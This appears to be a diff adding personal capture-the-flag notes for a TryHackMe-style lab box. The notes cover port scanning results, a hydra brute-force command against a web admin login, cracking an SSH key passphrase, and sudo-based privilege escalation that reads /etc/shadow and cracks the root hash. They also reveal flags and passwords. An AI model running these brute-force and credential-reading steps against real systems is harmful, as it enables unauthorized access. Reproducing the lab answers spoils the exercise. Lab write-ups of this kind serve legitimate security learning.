@@ -1,0 +1,46 @@
+IP : 10.10.44.26
+
+Open Ports : 22,80
+
+Version of SSH : OpenSSH 7.6p1
+Version of Apache : 2.4.29
+Linux Distribution : Ubuntu
+Hidden Dir : /admin
+	Source : two potential usernames : Web - admin : machine - john
+
+Lets broteforce the webpage : hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.44.26 http-post-form "/admin/:user=^USER^&pass=^PASS^&Login=Login:username or password invalid"
+
+	Found the password : [80][http-post-form] host: 10.10.44.26   login: admin   password: xavier
+
+	We got a flag : THM{brut3_f0rce_is_e4sy}
+
+	We also found ssh key for john : 
+
+Lets use the key:
+	It is encrypted we need a passphrase : use ssh2john > rockinroll
+
+Lets SSH:
+
+we are in.
+
+We got user's flag : THM{a_password_is_not_a_barrier}
+
+
+PrivEsc :
+
+Running sudo -l we found that:
+
+	User john may run the following commands on bruteit:                                                                                   
+	(root) NOPASSWD: /bin/cat  
+
+Lets check GtfoBins:
+
+We can directly cat out root flag : THM{pr1v1l3g3_3sc4l4t10n}
+
+Also similarly we can read /etc/shadow file and get the hash for roots password : 
+
+	sha512crypt : $6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
+
+Use john to crack the password : football
+
+!!!
